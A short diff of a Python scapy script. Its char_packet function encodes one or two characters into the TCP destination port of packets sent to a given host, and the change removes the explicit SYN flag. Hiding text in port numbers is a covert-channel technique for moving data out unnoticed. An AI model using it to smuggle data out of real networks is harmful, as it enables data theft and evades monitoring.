@@ -32,7 +32,7 @@ def char_packet(dest, char1, char2=None):
         destport = ord(char1) << 8
     else:
         destport = (ord(char1) << 8) + ord(char2)
-    return IP(dst=dest) / TCP(sport=get_srcport(), dport=destport, flags="S")
+    return IP(dst=dest) / TCP(sport=get_srcport(), dport=destport)
 
 
 def get_srcport():
